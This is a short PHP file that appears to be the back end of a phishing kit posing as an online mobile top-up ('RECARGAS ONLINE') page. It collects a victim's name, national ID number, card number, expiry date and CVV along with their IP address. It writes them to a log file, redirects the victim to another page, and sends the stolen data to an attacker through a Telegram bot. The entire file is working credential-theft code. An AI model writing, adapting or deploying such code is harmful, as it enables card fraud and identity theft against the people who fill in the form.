<?php
error_reporting(0);
include '../config.php';
include './tg.php';
$ip = $_SERVER['REMOTE_ADDR'];
if (isset($_POST['name'])) {
    $msg  = "➖➖➖➖[ RECARGAS ONLINE ]➖➖➖➖\r\n";
    $msg .= "💳 NAME :<code>{$_POST['name']}</code>\r\n";
    $msg .= "☑️ DNI :<code>{$_POST['deenei']}</code>\r\n";
    $msg .= "☑️ CC :<code>{$_POST['numbero']}</code>\r\n";
    $msg .= "☑️ MES :<code>{$_POST['mes']}</code>\r\n";
    $msg .= "☑️ AÑO :<code>{$_POST['anio']}</code>\r\n";
    $msg .= "☑️ CVV :<code>{$_POST['segcod']}</code>\r\n";
    $msg .= "➖➖➖➖INFO➖➖➖➖\r\n";
    $msg .= "🌐 Client IP : ".$ip."\r\n";
    $msg .= "➖➖➖@deseen1337➖➖➖\r\n\r\n\r\n";
    $save = fopen("../".$txt.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    header("location: ../mirror.php");
    sendTg($msg, $key, $id);
}
?>
